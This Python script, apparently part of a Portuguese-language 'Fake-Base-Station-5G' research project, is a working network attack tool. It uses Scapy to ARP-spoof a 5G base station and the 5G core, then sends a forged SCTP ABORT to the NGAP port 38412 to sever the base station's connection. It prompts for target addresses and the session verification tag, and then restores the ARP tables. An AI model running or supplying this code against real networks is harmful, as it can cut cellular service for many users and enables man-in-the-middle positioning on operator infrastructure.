#Projeto Fake-Base-Station-5G
#Criado por Roger W. Coêlho
#Código ARP Spoofing ABORT SCTP
#Código para o envio de mensagem de ABORT na conexão SCTP entre a ERB verdadeira e o Núcleo 5G

from scapy.all import ARP, send, getmacbyip
import sys
from scapy.layers.sctp import SCTP, SCTPChunkAbort
from scapy.layers.inet import IP


#Função Arp Spoofing
def spoofing(target1, target2, target1MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, op=2)
    send(arp_reply, verbose=0)


#Função de parada do Arp Spoofing
def stop_spoofing(target1, target2, target1MAC, target2MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, hwsrc=target2MAC, op=2)
    send(arp_reply, verbose=0, count=4)


#Função de envio de ABORT SCTP
def abort_sctp_spoofing(target1, target2, src, dst,verfication_tag):
    
    vtag = int(verfication_tag, 16)

    send(IP(src = target1, dst = target2, flags=2, id=0, tos=0x02)/SCTP(sport = int(src), dport = dst, tag = vtag)/SCTPChunkAbort(type=6, reserved=None, TCB=0, len=None, error_causes=b''))


#Função Main
def main():
    
    try:        

        print("ARP Spoofing ABORT Iniciado!!!")

        ip_erb = input("Entre com o endereço IP da ERB: ")
        ip_amf = input("Entre com o endereço IP do Núcleo 5G: ")
        source_port = input("Informe a porta do cliente NGAP da ERB: ")
        destination_port = 38412 #Porta Servidor NGAP
        vtag_sctp = input("Informe a Verification Tag da sessão SCTP entre a ERB e o Núcleo 5G: ")

        target1 = ip_erb
        target2 = ip_amf
       
        try:
            target1MAC = str(getmacbyip(target1))
            target2MAC = str(getmacbyip(target2))
        
        except OSError:
            print("Certifique-se de digitar os endereços IP corretamente!!!")
            sys.exit(1)
        
        
        spoofing(target1, target2, target1MAC)
        spoofing(target2, target1, target2MAC)

        print("[!] Enviando Pacotes ARP Spoofing...")

        abort_sctp_spoofing(target1, target2, source_port, destination_port, vtag_sctp)

        print("[!] Enviando Pacotes ARP Spoofing ABORT SCTP...")
            
        stop_spoofing(target1, target2, target1MAC, target2MAC)
        stop_spoofing(target2, target1, target2MAC, target1MAC)
               

    except KeyboardInterrupt:        
        print()
        print("[!] CTRL+C Detectado!!!")
          
    print("ARP Spoofing SCTP ABORT Finalizado!!!")


if __name__ == "__main__":
    main()